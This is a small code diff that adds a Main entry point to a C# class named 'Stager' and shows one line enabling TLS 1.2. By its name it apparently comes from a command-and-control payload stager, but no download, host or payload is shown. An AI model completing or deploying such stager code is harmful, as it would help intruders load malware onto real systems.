@@ -6,6 +6,11 @@ namespace Charon
 {
     public class Stager
     {
+        public static void Main()
+        {
+            Execute();
+        }
+
         public static void Execute()
         {
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
